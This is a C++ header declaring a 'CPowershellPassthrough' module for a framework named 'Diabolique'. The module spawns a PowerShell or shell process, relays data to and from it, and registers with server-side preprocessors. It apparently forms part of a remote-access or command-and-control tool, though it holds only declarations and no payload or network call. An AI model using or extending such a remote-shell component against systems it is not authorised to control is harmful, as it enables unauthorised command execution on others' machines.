#ifndef _H_CPOWERSHELLPASSTHROUGH
#define _H_CPOWERSHELLPASSTHROUGH


#ifdef _MSC_VER
#pragma once
#endif


#include "ExternalLibrary/include/IDiaboliqueModule.h"
#include "ExternalLibrary/include/ProcessController/CDiabolqiueProcess.h"
#include "ExternalLibrary/include/ProcessController/ProcessController.h"
#include "IDiaboliqueIO.h"
#include <atomic>


/*
	Essentially CDiaboliqueProcess but specifically for powershell/shell
	applications
*/

class CPowershellPassthrough : public IDiaboliqueModule
{
public:
	CPowershellPassthrough();
	virtual bool Initialize(void* pArgs, size_t nDataSize);
	virtual bool ShutDown();
	virtual bool FreeLibrary();
	virtual bool SendData(void* pData, size_t nDataSize, size_t& nDataSent);
	virtual bool RecvData(void* pBuffer, size_t nBufferSize, size_t& nDataRecieved);
	virtual bool IsConnectionAlive() { return (m_bAlive || !m_bInitialized); } // if we aren't initialized, we have yet to be born

#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
	virtual std::string GetConnectionName()
	{
		return "CPowershellPassthrough";
	}
#endif
protected:
	bool SpawnProcess(std::string* path, char* cmd);

private:

	ProcessController::CProcess m_Process;
	std::atomic<bool> m_bAlive = false;
	std::atomic<bool> m_bInitialized = false;
};

inline IDiaboliqueModule* __stdcall CreatePowershellPassthrough()
{

	if (!ProcessController::IsInitialized())
	{
		InitializeProcessController();
	}

	return new CPowershellPassthrough();
}



#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
bool __stdcall GenerateInitializationForPowershell(std::string input, void** ppMemory, size_t& nDataSize);
inline bool __stdcall UserPassthroughForPowershell(std::string* input)
{
	*input += "\r\n";
	return true;
}

class InitPowershellPreProcessor : public IDiaboliqueModuleServerDefaultInitializer
{
public:
	InitPowershellPreProcessor()
	{
		_INIT_AddModulePreProcessor(&UserPassthroughForPowershell, &GenerateInitializationForPowershell, (int)DiaboliqueModuleType_t::k_dmtPowershellPassthrough, "Powershell PassThrough");
	}
};

inline InitPowershellPreProcessor pwspreprocess;

#endif

#endif // _H_CPOWERSHELLPASSTHROUGH
